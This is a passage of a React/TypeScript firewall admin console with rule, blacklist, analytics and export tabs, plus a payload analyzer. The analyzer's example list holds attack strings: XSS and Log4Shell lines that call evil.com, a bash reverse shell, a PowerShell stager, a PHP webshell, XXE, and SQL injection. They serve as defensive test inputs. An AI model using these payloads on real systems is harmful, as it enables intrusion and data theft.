          <button key={s} onClick={()=>setSec(s)} style={{ background:sec===s?"#00ff8822":"#111", border:`1px solid ${sec===s?"#00ff8844":"#333"}`, color:sec===s?"#00ff88":"#555", borderRadius:6, padding:"6px 12px", cursor:"pointer", fontSize:10, fontFamily:"monospace", textTransform:"uppercase" }}>
            {s==="rules"?`Standard Rules (${rData?.total??0})`:`FQDN Rules (${fData?.total??0})`}
          </button>
        ))}
        <button onClick={()=>chk()} style={{ marginLeft:"auto", background:"#ffaa0011", border:"1px solid #ffaa0033", color:"#ffaa00", borderRadius:6, padding:"6px 12px", cursor:"pointer", fontSize:10, fontFamily:"monospace", display:"flex", alignItems:"center", gap:5 }}>
          <AlertTriangle size={10}/>Check Conflicts
        </button>
      </div>
      {conflicts&&(
        <div style={{ background:conflicts.clean?"#00ff8811":"#ff440011", border:`1px solid ${conflicts.clean?"#00ff8833":"#ff440033"}`, borderRadius:8, padding:12 }}>
          {conflicts.clean?<div style={{ color:"#00ff88", fontSize:12 }}>✓ No conflicts — ruleset is clean</div>:(
            (conflicts.conflicts??[]).map((c:{type?:string;rule1?:string;description?:string;severity?:string},i:number)=>(
              <div key={i} style={{ marginBottom:6, display:"flex", gap:8, alignItems:"center" }}>
                <Bdg label={c.type??""} color={c.severity==="critical"?"#ff2244":c.severity==="high"?"#ff6600":"#ffaa00"} sm/>
                <span style={{ fontSize:11, color:"#888" }}>{c.description}</span>
              </div>
            ))
          )}
        </div>
      )}
      {sec==="rules"?(
        <div style={{ display:"grid", gridTemplateColumns:"1fr 270px", gap:12 }}>
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, overflow:"auto", maxHeight:440 }}>
            <table style={{ width:"100%", borderCollapse:"collapse", fontSize:11 }}>
              <thead><tr style={{ borderBottom:"1px solid #1a1a1a" }}>{["#","Name","Dir","Action","Protocol","Port","Hits",""].map(h=><th key={h} style={{ padding:"8px 12px", textAlign:"left", color:"#444", fontSize:10, textTransform:"uppercase" }}>{h}</th>)}</tr></thead>
              <tbody>{(rData?.rules??[]).map(r=>(
                <tr key={r.id} style={{ borderBottom:"1px solid #0d0d0d", opacity:r.enabled?1:0.45 }}>
                  <td style={{ padding:"7px 12px", color:"#444", fontFamily:"monospace", fontSize:10 }}>{r.priority}</td>
                  <td style={{ padding:"7px 12px", color:"#bbb" }}>{r.name}</td>
                  <td style={{ padding:"7px 12px" }}><Bdg label={r.direction} color="#44aaff" sm/></td>
                  <td style={{ padding:"7px 12px" }}><Bdg label={r.action} color={r.action==="allow"?"#00ff88":"#ff4444"} sm/></td>
                  <td style={{ padding:"7px 12px", color:"#666", fontFamily:"monospace" }}>{r.protocol}</td>
                  <td style={{ padding:"7px 12px", color:"#666", fontFamily:"monospace" }}>{r.destPort??"any"}</td>
                  <td style={{ padding:"7px 12px", color:"#ff9900", fontFamily:"monospace" }}>{r.hitCount}</td>
                  <td style={{ padding:"7px 12px", display:"flex", gap:5 }}>
                    <button onClick={()=>uR.mutate({id:r.id,data:{enabled:!r.enabled}},{onSuccess:()=>rR()})} style={{ background:r.enabled?"#00ff8811":"#22222222", border:`1px solid ${r.enabled?"#00ff8833":"#333"}`, color:r.enabled?"#00ff88":"#444", borderRadius:3, padding:"2px 8px", cursor:"pointer", fontSize:9, fontFamily:"monospace" }}>{r.enabled?"ON":"OFF"}</button>
                    <button onClick={()=>dR.mutate({id:r.id},{onSuccess:()=>rR()})} style={{ background:"none", border:"1px solid #ff444433", borderRadius:3, padding:"2px 5px", cursor:"pointer", color:"#ff4444" }}><Trash2 size={8}/></button>
                  </td>
                </tr>
              ))}</tbody>
            </table>
          </div>
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, display:"flex", flexDirection:"column", gap:10, alignSelf:"start" }}>
            <div style={{ fontSize:10, color:"#444", textTransform:"uppercase" }}>Add Rule</div>
            <input value={rf.name} onChange={e=>setRf(p=>({...p,name:e.target.value}))} placeholder="Rule name..." style={{ background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontSize:11, outline:"none" }}/>
            {[{l:"Direction",k:"direction",opts:["inbound","outbound","both"]},{l:"Action",k:"action",opts:["allow","deny","drop","reject","log"]},{l:"Protocol",k:"protocol",opts:["tcp","udp","icmp","any"]}].map(f=>(
              <div key={f.k}><div style={{ fontSize:10, color:"#444", marginBottom:3 }}>{f.l}</div>
                <select value={rf[f.k as keyof typeof rf]} onChange={e=>setRf(p=>({...p,[f.k]:e.target.value}))} style={{ width:"100%", background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px", color:"#ccc", fontSize:11, cursor:"pointer" }}>{f.opts.map(o=><option key={o}>{o}</option>)}</select>
              </div>
            ))}
            <input value={rf.destPort} onChange={e=>setRf(p=>({...p,destPort:e.target.value}))} placeholder="Dest port (optional)..." style={{ background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontSize:11, outline:"none" }}/>
            <button onClick={()=>cR.mutate({data:{name:rf.name,direction:rf.direction as "inbound"|"outbound"|"both",action:rf.action as "allow"|"deny"|"drop"|"reject"|"masquerade"|"log",protocol:rf.protocol as "tcp"|"udp"|"icmp"|"any",destPort:rf.destPort||undefined}},{onSuccess:()=>{rR();setRf({name:"",direction:"inbound",action:"deny",protocol:"tcp",destPort:""});}})} disabled={!rf.name} style={{ background:"#00ff8822", border:"1px solid #00ff8844", color:"#00ff88", borderRadius:6, padding:"7px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>
              <Plus size={10} style={{ marginRight:4, verticalAlign:"middle" }}/>Add Rule
            </button>
          </div>
        </div>
      ):(
        <div style={{ display:"grid", gridTemplateColumns:"1fr 270px", gap:12 }}>
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, overflow:"auto", maxHeight:440 }}>
            <table style={{ width:"100%", borderCollapse:"collapse", fontSize:11 }}>
              <thead><tr style={{ borderBottom:"1px solid #1a1a1a" }}>{["Domain","Action","Direction","Priority","Hits",""].map(h=><th key={h} style={{ padding:"8px 12px", textAlign:"left", color:"#444", fontSize:10, textTransform:"uppercase" }}>{h}</th>)}</tr></thead>
              <tbody>{(fData?.rules??[]).map(r=>(
                <tr key={r.id} style={{ borderBottom:"1px solid #0d0d0d", opacity:r.enabled?1:0.45 }}>
                  <td style={{ padding:"7px 12px", fontFamily:"monospace", color:"#bbb" }}>{r.domain}</td>
                  <td style={{ padding:"7px 12px" }}><Bdg label={r.action} color={r.action==="allow"?"#00ff88":"#ff4444"} sm/></td>
                  <td style={{ padding:"7px 12px" }}><Bdg label={r.direction} color="#44aaff" sm/></td>
                  <td style={{ padding:"7px 12px", fontFamily:"monospace", color:"#555" }}>{r.priority}</td>
                  <td style={{ padding:"7px 12px", color:"#ff9900", fontFamily:"monospace" }}>{r.hitCount}</td>
                  <td style={{ padding:"7px 12px", display:"flex", gap:5 }}>
                    <button onClick={()=>uF.mutate({id:r.id,data:{enabled:!r.enabled}},{onSuccess:()=>rF()})} style={{ background:r.enabled?"#00ff8811":"#22222222", border:`1px solid ${r.enabled?"#00ff8833":"#333"}`, color:r.enabled?"#00ff88":"#444", borderRadius:3, padding:"2px 8px", cursor:"pointer", fontSize:9, fontFamily:"monospace" }}>{r.enabled?"ON":"OFF"}</button>
                    <button onClick={()=>dF.mutate({id:r.id},{onSuccess:()=>rF()})} style={{ background:"none", border:"1px solid #ff444433", borderRadius:3, padding:"2px 5px", cursor:"pointer", color:"#ff4444" }}><Trash2 size={8}/></button>
                  </td>
                </tr>
              ))}</tbody>
            </table>
          </div>
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, display:"flex", flexDirection:"column", gap:10, alignSelf:"start" }}>
            <div style={{ fontSize:10, color:"#444", textTransform:"uppercase" }}>Add FQDN Rule</div>
            <input value={ff.domain} onChange={e=>setFf(p=>({...p,domain:e.target.value}))} placeholder="*.tracking.com or exact.domain.com" style={{ background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontFamily:"monospace", fontSize:11, outline:"none" }}/>
            {[{l:"Action",k:"action",opts:["allow","block"]},{l:"Direction",k:"direction",opts:["both","inbound","outbound"]}].map(f=>(
              <div key={f.k}><div style={{ fontSize:10, color:"#444", marginBottom:3 }}>{f.l}</div>
                <select value={ff[f.k as keyof typeof ff]} onChange={e=>setFf(p=>({...p,[f.k]:e.target.value}))} style={{ width:"100%", background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px", color:"#ccc", fontSize:11, cursor:"pointer" }}>{f.opts.map(o=><option key={o}>{o}</option>)}</select>
              </div>
            ))}
            <button onClick={()=>cF.mutate({data:{domain:ff.domain,action:ff.action as "allow"|"block",direction:ff.direction as "both"|"inbound"|"outbound"}},{onSuccess:()=>{rF();setFf({domain:"",action:"block",direction:"both"});}})} disabled={!ff.domain} style={{ background:"#44aaff22", border:"1px solid #44aaff44", color:"#44aaff", borderRadius:6, padding:"7px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>
              <Plus size={10} style={{ marginRight:4, verticalAlign:"middle" }}/>Add FQDN Rule
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

// ── Blacklist ─────────────────────────────────────────────────────────────
function BlacklistTab() {
  const { data, refetch } = useListBlockedIps();
  const block = useBlockIp(); const unblock = useUnblockIp();
  const [form, setForm] = useState({ ip:"", reason:"", exp:"" });
  const [intelIp, setIntelIp] = useState<string|null>(null);
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 260px", gap:16 }}>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, overflow:"auto", maxHeight:560 }}>
        <div style={{ padding:"10px 14px", borderBottom:"1px solid #1a1a1a", fontSize:11, color:"#ff4444", fontWeight:700 }}>Blocked IPs — {data?.total??0}</div>
        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:11 }}>
          <thead><tr style={{ borderBottom:"1px solid #111" }}>{["IP","Reason","Auto","Hits","Blocked At",""].map(h=><th key={h} style={{ padding:"8px 12px", textAlign:"left", color:"#444", fontSize:10, textTransform:"uppercase" }}>{h}</th>)}</tr></thead>
          <tbody>{(data?.blockedIps??[]).map(b=>(
            <tr key={b.id} style={{ borderBottom:"1px solid #0d0d0d" }}>
              <td style={{ padding:"7px 12px", fontFamily:"monospace" }}>
                <div style={{ display:"flex", alignItems:"center", gap:6 }}>
                  <span style={{ color:"#ff4444" }}>{b.ip}</span>
                  <button onClick={()=>setIntelIp(b.ip)} title="Attacker Intel — CVEs, exploits, port scan, SQLmap" style={{ background:"#ff222211", border:"1px solid #ff222233", color:"#ff4444", borderRadius:3, padding:"1px 6px", cursor:"pointer", fontSize:8, fontFamily:"monospace", letterSpacing:1 }}>INTEL</button>
                </div>
              </td>
              <td style={{ padding:"7px 12px", color:"#666", maxWidth:220, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>{b.reason}</td>
              <td style={{ padding:"7px 12px" }}>{b.autoBlocked?<Bdg label="Auto" color="#ffaa00" sm/>:<Bdg label="Manual" color="#555" sm/>}</td>
              <td style={{ padding:"7px 12px", fontFamily:"monospace", color:"#ff9900" }}>{b.hitCount}</td>
              <td style={{ padding:"7px 12px", color:"#444", fontSize:10 }}>{new Date(b.blockedAt).toLocaleString()}</td>
              <td style={{ padding:"7px 12px" }}><button onClick={()=>unblock.mutate({id:b.id},{onSuccess:()=>refetch()})} style={{ background:"#00ff8811", border:"1px solid #00ff8833", color:"#00ff88", borderRadius:3, padding:"2px 8px", cursor:"pointer", fontSize:9, fontFamily:"monospace" }}>Unblock</button></td>
            </tr>
          ))}</tbody>
        </table>
        {intelIp && (
          <div style={{ position:"fixed", inset:0, zIndex:9999, display:"flex" }}>
            <div style={{ flex:1 }} onClick={()=>setIntelIp(null)} />
            <div style={{ width:540, borderLeft:"1px solid #ff222244", background:"#000", display:"flex", flexDirection:"column", boxShadow:"-8px 0 40px rgba(255,34,68,0.1)" }}>
              <AttackerIntelPanelFw ip={intelIp} onClose={()=>setIntelIp(null)} />
            </div>
          </div>
        )}
      </div>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, display:"flex", flexDirection:"column", gap:10, alignSelf:"start" }}>
        <div style={{ fontSize:10, color:"#444", textTransform:"uppercase" }}>Block IP</div>
        <input value={form.ip} onChange={e=>setForm(p=>({...p,ip:e.target.value}))} placeholder="1.2.3.4 or CIDR..." style={{ background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontFamily:"monospace", fontSize:11, outline:"none" }}/>
        <input value={form.reason} onChange={e=>setForm(p=>({...p,reason:e.target.value}))} placeholder="Reason..." style={{ background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontSize:11, outline:"none" }}/>
        <input value={form.exp} onChange={e=>setForm(p=>({...p,exp:e.target.value}))} placeholder="Expires in (min, optional)..." style={{ background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontSize:11, outline:"none" }}/>
        <button onClick={()=>block.mutate({data:{ip:form.ip,reason:form.reason,expiresInMinutes:form.exp?parseInt(form.exp):undefined}},{onSuccess:()=>{refetch();setForm({ip:"",reason:"",exp:""});}})} disabled={!form.ip||!form.reason} style={{ background:"#ff444422", border:"1px solid #ff444444", color:"#ff4444", borderRadius:6, padding:"8px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>
          <Ban size={10} style={{ marginRight:5, verticalAlign:"middle" }}/>Block IP
        </button>
      </div>
    </div>
  );
}

// ── Analytics ─────────────────────────────────────────────────────────────
function AnalyticsTab() {
  const { data } = useGetFirewallAnalytics();
  const mx = Math.max(...(data?.topBlockedIps??[]).map((b:{hits?:number})=>b.hits??0),1);
  const tl = data?.threatLevel??"safe";
  const tlC = tl==="critical"?"#ff2244":tl==="high"?"#ff6600":tl==="medium"?"#ffaa00":tl==="low"?"#aaccff":"#00ff88";
  return (
    <div style={{ display:"flex", flexDirection:"column", gap:14 }}>
      <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", gap:12 }}>
        {[{l:"Threat Level",v:tl.toUpperCase(),c:tlC},{l:"Total Blocked",v:(data?.totalBlocked24h??0).toLocaleString(),c:"#ff4444"},{l:"IPS Hits",v:(data?.totalIpsHits24h??0).toLocaleString(),c:"#ff9900"},{l:"DPI Hits",v:(data?.totalDpiHits24h??0).toLocaleString(),c:"#44aaff"}].map(s=>(
          <div key={s.l} style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:16, textAlign:"center" }}>
            <div style={{ fontSize:24, fontWeight:900, color:s.c, fontFamily:"monospace" }}>{s.v}</div>
            <div style={{ fontSize:10, color:"#444", marginTop:4 }}>{s.l}</div>
          </div>
        ))}
      </div>
      <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
          <div style={{ fontSize:11, color:"#ff4444", fontWeight:700, marginBottom:12 }}>Top Blocked IPs</div>
          {(data?.topBlockedIps??[]).length===0?<div style={{color:"#333",fontSize:11}}>No blocks yet</div>:(data?.topBlockedIps??[]).map((b:{ip?:string;hits?:number;reason?:string},i:number)=>(
            <div key={i} style={{ marginBottom:10 }}>
              <div style={{ display:"flex", justifyContent:"space-between", fontSize:11, marginBottom:3 }}>
                <span style={{ fontFamily:"monospace", color:"#ff4444" }}>{b.ip}</span>
                <span style={{ color:"#ff9900", fontFamily:"monospace" }}>{b.hits}</span>
              </div>
              <div style={{ height:3, background:"#1a1a1a", borderRadius:2 }}>
                <div style={{ height:"100%", background:"#ff4444", borderRadius:2, width:`${((b.hits??0)/mx)*100}%` }}/>
              </div>
            </div>
          ))}
        </div>
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
          <div style={{ fontSize:11, color:"#ff9900", fontWeight:700, marginBottom:12 }}>IPS Category Breakdown</div>
          {(data?.ipsCategoryBreakdown??[]).map((cat:{category?:string;total?:number;enabled?:number;hits?:number})=>(
            <div key={cat.category} style={{ marginBottom:10 }}>
              <div style={{ display:"flex", justifyContent:"space-between", fontSize:11, marginBottom:3 }}>
                <span style={{ fontFamily:"monospace", textTransform:"uppercase", fontSize:10 }}>{cat.category}</span>
                <div style={{ display:"flex", gap:8 }}><span style={{ color:"#444", fontSize:9 }}>{cat.enabled}/{cat.total}</span><span style={{ color:"#ff9900", fontFamily:"monospace" }}>{cat.hits}</span></div>
              </div>
              <div style={{ height:3, background:"#1a1a1a", borderRadius:2 }}>
                <div style={{ height:"100%", background:"#ff9900", borderRadius:2, width:`${((cat.enabled??0)/Math.max(cat.total??1,1))*100}%` }}/>
              </div>
            </div>
          ))}
        </div>
      </div>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
        <div style={{ fontSize:11, color:"#cc44ff", fontWeight:700, marginBottom:10 }}>GhostOS™ Top Triggered Rules</div>
        {(data?.topGhostOsRules??[]).length===0?<div style={{color:"#333",fontSize:11}}>No GhostOS™ rule triggers yet</div>:(data?.topGhostOsRules??[]).map((r:{rule?:string;hits?:number;description?:string},i:number)=>(
          <div key={i} style={{ display:"flex", alignItems:"center", gap:12, background:"#111", borderRadius:6, padding:"7px 12px", marginBottom:6 }}>
            <span style={{ fontFamily:"monospace", fontSize:12, color:"#cc44ff" }}>{r.rule}</span>
            <span style={{ fontSize:10, color:"#444", flex:1 }}>{r.description}</span>
            <span style={{ fontFamily:"monospace", color:"#ff9900", fontSize:11 }}>{r.hits} hits</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ── Export ────────────────────────────────────────────────────────────────
function ExportTab() {
  const { mutate: gen, data, isPending } = useGenerateIptablesRules();
  const [copied, setCopied] = useState<string|null>(null);
  const copy = (k:string,t:string)=>{ navigator.clipboard.writeText(t); setCopied(k); setTimeout(()=>setCopied(null),1500); };
  const dl = (fn:string,c:string)=>{ const a=document.createElement("a"); a.href=URL.createObjectURL(new Blob([c],{type:"text/plain"})); a.download=fn; a.click(); };
  const d = data as Record<string,string>|undefined;
  return (
    <div style={{ display:"flex", flexDirection:"column", gap:14 }}>
      <div style={{ display:"flex", alignItems:"center", gap:12 }}>
        <button onClick={()=>gen()} disabled={isPending} style={{ background:"#00ff8822", border:"1px solid #00ff8844", color:"#00ff88", borderRadius:8, padding:"10px 20px", cursor:"pointer", fontSize:12, fontFamily:"monospace", display:"flex", alignItems:"center", gap:8 }}>
          <RefreshCw size={13}/>{isPending?"Generating...":"Generate All Rulesets"}
        </button>
        <span style={{ fontSize:11, color:"#444" }}>Compiles GhostOS™ SymScript™ + standard rules → iptables, nftables, WireGuard, pfSense</span>
      </div>
      {d&&(
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:12 }}>
          {[
            {k:"iptables",l:"iptables-save Format",c:d.iptablesRules,color:"#00ff88",fn:"proxhqvpn-firewall.iptables"},
            {k:"nftables",l:"nftables Format",c:d.nftablesRules,color:"#44aaff",fn:"proxhqvpn-firewall.nft"},
            {k:"wg",l:"WireGuard Masquerade",c:d.wireguardMasquerade,color:"#cc44ff",fn:"wg-masquerade.sh"},
            {k:"ghost",l:"GhostOS™ SymScript™",c:d.ghostOsSymscript,color:"#ff9900",fn:"proxhqos-rules.symscript"},
          ].map(s=>(
            <div key={s.k} style={{ background:"#0a0a0a", border:`1px solid ${s.color}22`, borderRadius:8, overflow:"hidden" }}>
              <div style={{ padding:"10px 14px", borderBottom:"1px solid #1a1a1a", display:"flex", alignItems:"center", justifyContent:"space-between" }}>
                <span style={{ fontSize:11, color:s.color, fontFamily:"monospace", fontWeight:700 }}>{s.l}</span>
                <div style={{ display:"flex", gap:6 }}>
                  <button onClick={()=>copy(s.k,s.c??"")} style={{ background:"none", border:"1px solid #222", borderRadius:3, padding:"2px 7px", cursor:"pointer", color:copied===s.k?"#00ff88":"#444", fontSize:10 }}>{copied===s.k?<Check size={9}/>:<Copy size={9}/>}</button>
                  <button onClick={()=>dl(s.fn,s.c??"")} style={{ background:"none", border:"1px solid #222", borderRadius:3, padding:"2px 7px", cursor:"pointer", color:"#444", fontSize:10 }}><Download size={9}/></button>
                </div>
              </div>
              <pre style={{ padding:12, fontSize:10, color:"#555", fontFamily:"monospace", maxHeight:180, overflow:"auto", margin:0, whiteSpace:"pre-wrap" }}>
                {(s.c??"").substring(0,1200)}{(s.c??"").length>1200?"\n...":""}
              </pre>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// ══════════════════════════════════════════════════════════════════════════════
// ── Payload Code Analyzer Tab ─────────────────────────────────────────────────
// ══════════════════════════════════════════════════════════════════════════════

interface FlaggedToken { line: number; col: number; token: string; reason: string; severity: string; score: number }
interface ObfFlag     { type: string; detail: string; score: number }
interface StructFlag  { type: string; detail: string; score: number }
interface WAFMatch    { name: string; attackType: string; severity: string; pattern: string }
interface AnalysisResult {
  verdict:          "malicious" | "suspicious" | "clean";
  confidence:       number;
  anomalyScore:     number;
  detectedLanguage: string;
  entropy:          number;
  threatCategories: string[];
  recommendation:   string;
  flaggedTokens:    FlaggedToken[];
  obfuscationFlags: ObfFlag[];
  structuralFlags:  StructFlag[];
  wafRuleMatches:   WAFMatch[];
  summary:          { tokenHits: number; obfuscation: number; structural: number; wafMatches: number };
}

const EXAMPLE_PAYLOADS: Record<string, { label: string; code: string }> = {
  sqli:   { label: "SQL Injection",    code: "' UNION SELECT username, password FROM users WHERE '1'='1'; -- " },
  xss:    { label: "XSS Payload",      code: '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">' },
  shell:  { label: "Bash Reverse Shell", code: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" },
  ps:     { label: "PowerShell Stager", code: "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMAV" },
  php:    { label: "PHP Webshell",     code: '<?php system($_GET["cmd"]); ?>' },
  xxe:    { label: "XXE Injection",    code: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' },
  log4:   { label: "Log4Shell",        code: '${jndi:ldap://evil.com:1234/a}' },
  python: { label: "Python RCE",       code: "__import__('os').system('id; cat /etc/passwd')" },
  proto:  { label: "Prototype Pollution", code: '{"__proto__": {"isAdmin": true, "role": "superuser"}}' },
};

const VERDICT_STYLE: Record<string, { bg: string; border: string; text: string; glow: string }> = {
  malicious:  { bg: "#1a0005", border: "#ff2244", text: "#ff4466", glow: "#ff224440" },
  suspicious: { bg: "#1a0e00", border: "#ff8800", text: "#ffaa33", glow: "#ff880040" },
  clean:      { bg: "#001a0a", border: "#00cc55", text: "#00ff88", glow: "#00cc5540" },
};
const SEV_C: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#aaccff" };

function TokenRow({ t, idx }: { t: FlaggedToken; idx: number }) {
  const [exp, setExp] = useState(false);
  const c = SEV_C[t.severity] ?? "#888";
  return (
    <div style={{ borderBottom:"1px solid #111", padding:"6px 0" }}>
      <div style={{ display:"flex", alignItems:"center", gap:8, cursor:"pointer" }} onClick={() => setExp(e => !e)}>
        {exp ? <ChevronDown size={10} color="#555"/> : <ChevronRight size={10} color="#555"/>}
        <span style={{ color:c, fontFamily:"monospace", fontSize:10, fontWeight:700, letterSpacing:1, minWidth:70, textTransform:"uppercase" }}>{t.severity}</span>
        <code style={{ color:"#ff9933", fontSize:10, background:"#1a0f00", padding:"1px 5px", borderRadius:3, maxWidth:220, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>{t.token}</code>
        <span style={{ color:"#555", fontSize:9 }}>L{t.line}:{t.col}</span>
        <span style={{ marginLeft:"auto", color:"#ff6600", fontSize:9, fontFamily:"monospace" }}>+{t.score}</span>
      </div>
      {exp && (
        <div style={{ paddingLeft:24, marginTop:4, color:"#777", fontSize:10, lineHeight:1.5 }}>
          {t.reason}
        </div>
      )}
    </div>
  );
}

function FlagSection({ title, items, color }: { title: string; items: Array<{ type: string; detail: string; score: number }>; color: string }) {
  if (!items.length) return null;
  return (
    <div style={{ background:"#0a0a0a", border:`1px solid ${color}33`, borderRadius:8, padding:14, marginBottom:12 }}>
      <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color, marginBottom:8 }}>{title}</div>
      {items.map((f, i) => (
        <div key={i} style={{ display:"flex", gap:8, padding:"5px 0", borderBottom: i < items.length-1 ? "1px solid #111" : "none" }}>
          <code style={{ color:"#888", fontSize:9, background:"#111", padding:"1px 5px", borderRadius:3, flexShrink:0 }}>{f.type}</code>
          <span style={{ color:"#aaa", fontSize:10, flex:1 }}>{f.detail}</span>
          <span style={{ color, fontSize:9, fontFamily:"monospace", flexShrink:0 }}>+{f.score}</span>
        </div>
      ))}
    </div>
  );
}

function PayloadAnalyzerTab() {
  const [code, setCode]           = useState("");
  const [language, setLanguage]   = useState("auto");
  const [context, setContext]     = useState("http_body");
  const [result, setResult]       = useState<AnalysisResult | null>(null);
  const [loading, setLoading]     = useState(false);
  const [error, setError]         = useState<string | null>(null);
  const [showRaw, setShowRaw]     = useState(false);
  const textareaRef               = useRef<HTMLTextAreaElement>(null);

  const analyze = useCallback(async () => {
    if (!code.trim()) return;
    setLoading(true);
    setError(null);
    setResult(null);
    try {
      const res = await fetch("/api/waf/analyze-code", {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({
          code,
          language: language === "auto" ? undefined : language,
          context,
          sourceIp: "admin-console",
        }),
      });
      if (!res.ok) { setError(`Server error: ${res.status}`); return; }
      setResult(await res.json() as AnalysisResult);
    } catch (e) {
      setError(String(e));
    } finally {
      setLoading(false);
    }
  }, [code, language, context]);

  const loadExample = useCallback((key: string) => {
    const ex = EXAMPLE_PAYLOADS[key];
    if (ex) { setCode(ex.code); setResult(null); }
  }, []);

  const vs   = result ? VERDICT_STYLE[result.verdict]! : null;
  const conf = result?.confidence ?? 0;

  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:16, alignItems:"start" }}>

      {/* ── Left: Editor Panel ── */}
      <div>
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:16, marginBottom:12 }}>
          <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:12 }}>
            <FlaskConical size={14} color="#00ff88"/>
            <span style={{ fontFamily:"monospace", fontWeight:800, fontSize:13, color:"#fff" }}>Payload Code Analyzer</span>
            <span style={{ fontSize:9, color:"#333", marginLeft:"auto" }}>Multi-layer: tokenization · entropy · structural · WAF</span>
          </div>

          {/* Controls */}
          <div style={{ display:"flex", gap:8, marginBottom:10, flexWrap:"wrap" }}>
            <select value={language} onChange={e => setLanguage(e.target.value)}
              style={{ background:"#111", border:"1px solid #222", color:"#ccc", borderRadius:4, padding:"4px 8px", fontSize:10, fontFamily:"monospace" }}>
              {["auto","sql","javascript","python","shell","powershell","php","xml","html","json"].map(l =>
                <option key={l} value={l}>{l === "auto" ? "Auto-detect language" : l.toUpperCase()}</option>
              )}
            </select>
            <select value={context} onChange={e => setContext(e.target.value)}
              style={{ background:"#111", border:"1px solid #222", color:"#ccc", borderRadius:4, padding:"4px 8px", fontSize:10, fontFamily:"monospace" }}>
              {["http_body","form_field","url_param","header","file_upload","cookie"].map(c =>
                <option key={c} value={c}>{c.replace(/_/g," ")}</option>
              )}
            </select>
          </div>

          {/* Code textarea */}
          <textarea
            ref={textareaRef}
            value={code}
            onChange={e => { setCode(e.target.value); setResult(null); }}
            placeholder="Paste any code, payload, or HTTP body here for deep malicious-code analysis…&#10;&#10;Examples: SQL injection, XSS, shell commands, PowerShell, PHP, XML/XXE, Python, Log4Shell"
            style={{ width:"100%", minHeight:240, background:"#050505", border:"1px solid #1a1a1a", color:"#00ff88", fontFamily:"'Courier New',monospace", fontSize:11, padding:12, borderRadius:6, resize:"vertical", outline:"none", boxSizing:"border-box", lineHeight:1.6 }}
          />

          <div style={{ display:"flex", gap:8, marginTop:10, alignItems:"center" }}>
            <button onClick={analyze} disabled={loading || !code.trim()}
              style={{ background: loading ? "#111" : "#00ff88", color:"#000", border:"none", borderRadius:6, padding:"8px 20px", fontFamily:"monospace", fontWeight:800, fontSize:12, cursor: loading ? "not-allowed" : "pointer", opacity: !code.trim() ? 0.4 : 1 }}>
              {loading ? "⟳ Analyzing…" : "🔬 Analyze Payload"}
            </button>
            <button onClick={() => { setCode(""); setResult(null); setError(null); }}
              style={{ background:"none", border:"1px solid #222", color:"#555", borderRadius:6, padding:"8px 14px", fontSize:11, cursor:"pointer" }}>
              Clear
            </button>
            {result && (
              <button onClick={() => setShowRaw(r => !r)}
                style={{ background:"none", border:"1px solid #222", color:"#555", borderRadius:6, padding:"8px 14px", fontSize:11, cursor:"pointer", marginLeft:"auto" }}>
                {showRaw ? "Hide Raw" : "Raw JSON"}
              </button>
            )}
          </div>

          {error && <div style={{ marginTop:10, color:"#ff4466", fontSize:11, fontFamily:"monospace" }}>⚠ {error}</div>}
        </div>

        {/* Example payloads */}
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
          <div style={{ fontFamily:"monospace", fontSize:10, color:"#444", marginBottom:8 }}>EXAMPLE PAYLOADS</div>
          <div style={{ display:"flex", flexWrap:"wrap", gap:6 }}>
            {Object.entries(EXAMPLE_PAYLOADS).map(([k, v]) => (
